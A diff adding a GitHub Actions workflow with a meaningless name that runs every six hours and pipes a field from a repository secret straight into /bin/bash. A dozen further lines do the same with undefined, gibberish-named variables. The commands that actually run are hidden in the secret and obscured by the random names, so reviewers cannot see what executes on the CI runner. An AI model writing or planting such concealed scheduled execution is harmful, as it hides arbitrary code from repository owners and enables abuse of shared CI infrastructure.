@@ -1,0 +1,32 @@
+name: qidianbizouu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qidianbizouu
+        env:
+          kugls77682: ${{ secrets.kugls77682 }}
+        run: |
+          echo $kugls77682 | jq -r .isreu48 | /bin/bash
+          echo $f687 | jq -r .hlen7430 | /bin/bash
+          echo $w86037 | jq -r .av57 | /bin/bash
+          echo $ixp2 | jq -r .zl28562 | /bin/bash
+          echo $cxduy17 | jq -r .c10 | /bin/bash
+          echo $epke9798 | jq -r .rlg95432 | /bin/bash
+          echo $kslq53 | jq -r .gyxo6 | /bin/bash
+          echo $aap69610 | jq -r .pjbg76568 | /bin/bash
+          echo $y27236 | jq -r .h794 | /bin/bash
+          echo $xlsng274 | jq -r .alyo10436 | /bin/bash
+          echo $hxulu32254 | jq -r .hmhm184 | /bin/bash
+          echo $jr7 | jq -r .sn41 | /bin/bash
+          echo $xs68601 | jq -r .hhx84408 | /bin/bash
+          echo $uqbtx7028 | jq -r .euutb1 | /bin/bash
+
